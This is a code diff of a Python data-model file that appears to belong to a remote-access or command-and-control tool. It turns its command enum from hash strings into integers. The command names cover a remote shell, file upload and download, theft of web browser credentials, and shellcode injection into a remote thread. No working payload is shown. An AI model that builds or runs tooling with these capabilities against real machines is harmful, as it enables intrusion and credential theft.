@@ -1,6 +1,6 @@
 from pydantic import BaseModel, Field, field_validator, BaseModel
 from typing import Union
-from enum import Enum
+from enum import Enum, IntEnum
 from uuid import UUID
 from ..Utils.tools import hex_to_bytes, gen_xml
 
@@ -24,31 +24,33 @@ class AgentConnection(BaseModel):
     
 
 
-class CommandIdentifiers(str, Enum):
-    START_SHELL_INSTANCE              = ("be425fd08e9ea24230bac47493228ada", "Start a shell instance on client")
-    RUN_COMMAND                       = ("58e129c7158b9fed8be5473640e54ae4", "Execute a command on a running shell instance")
-    GET_BASIC_MACHINE_INFO            = ("929cecb8e795d93306020c7f2e8682d2", "GET_BASIC_MACHINE_INFO")
-    SNAP_FULL_DIRECTORY               = ("74d6aa572d1b19102f9f5aedbe00dfd0", "SNAP_FULL_DIRECTORY")
-    GET_FILE_BASE_64                  = ("d69c0ca9f6848c89b7e9223b2d186a15", "GET_FILE_BASE_64")
-    UPLOAD_FILE_BASE_64               = ("81324d42b1bbe52342d521ee64b7a30f", "UPLOAD_FILE_BASE_64")
-    GET_WIFI_BAISIC_INFO              = ("0c9f43143832f340691b2f701b5d56fa", "UPLOAD_FILE_BASE_64")
-    FETCH_WEB_BROSER_CREDENTIALS      = ("852d663cbe347857ffe2bfadb378d3be", "FETCH_WEB_BROSER_CREDENTIALS") 
-    ENUMERATE_PROCESSES               = ("57886325b8715ae917d8fde55e4de227", "ENUMERATE_PROCESSES")
-    SHELLCODE_INJECTION_REMOTE_THREAD = ("e7fbbbf09d0c969980d29312271596e5", "SHELLCODE_INJECTION_REMOTE_THREAD")
-
-
-
-
-    def __new__(cls, value, description):
-        obj = str.__new__(cls, value)
-        obj._value_ = value
-        obj.description = description
-        return obj
+class CommandIdentifiers(IntEnum):
+    START_SHELL_INSTANCE              = 1
+    RUN_COMMAND                       = 2
+    GET_BASIC_MACHINE_INFO            = 3
+    SNAP_FULL_DIRECTORY               = 4
+    GET_FILE_BASE_64                  = 5
+    UPLOAD_FILE_BASE_64               = 6
+    GET_WIFI_BAISIC_INFO              = 7
+    FETCH_WEB_BROSER_CREDENTIALS      = 8
+    ENUMERATE_PROCESSES               = 9
+    SHELLCODE_INJECTION_REMOTE_THREAD = 10
 
     @property
     def desc(self):
-        """Returns the description of the command."""
-        return self.description
+        descriptions = {
+            CommandIdentifiers.START_SHELL_INSTANCE: "Start a shell instance on client",
+            CommandIdentifiers.RUN_COMMAND: "Execute a command on a running shell instance",
+            CommandIdentifiers.GET_BASIC_MACHINE_INFO: "GET_BASIC_MACHINE_INFO",
+            CommandIdentifiers.SNAP_FULL_DIRECTORY: "SNAP_FULL_DIRECTORY",
+            CommandIdentifiers.GET_FILE_BASE_64: "GET_FILE_BASE_64",
+            CommandIdentifiers.UPLOAD_FILE_BASE_64: "UPLOAD_FILE_BASE_64",
+            CommandIdentifiers.GET_WIFI_BAISIC_INFO: "GET_WIFI_BAISIC_INFO",
+            CommandIdentifiers.FETCH_WEB_BROSER_CREDENTIALS: "FETCH_WEB_BROSER_CREDENTIALS",
+            CommandIdentifiers.ENUMERATE_PROCESSES: "ENUMERATE_PROCESSES",
+            CommandIdentifiers.SHELLCODE_INJECTION_REMOTE_THREAD: "SHELLCODE_INJECTION_REMOTE_THREAD",
+        }
+        return descriptions.get(self, "")
 
 class CommandIdentifiersName(str, Enum):
     pass
@@ -60,7 +62,7 @@ CommandIdentifiersName = Enum(
 
 class Command(BaseModel):
 
-    action: str = Field(
+    action: int = Field(
         ...,
         title="Action",
         description="The identifier of the action to perform.",
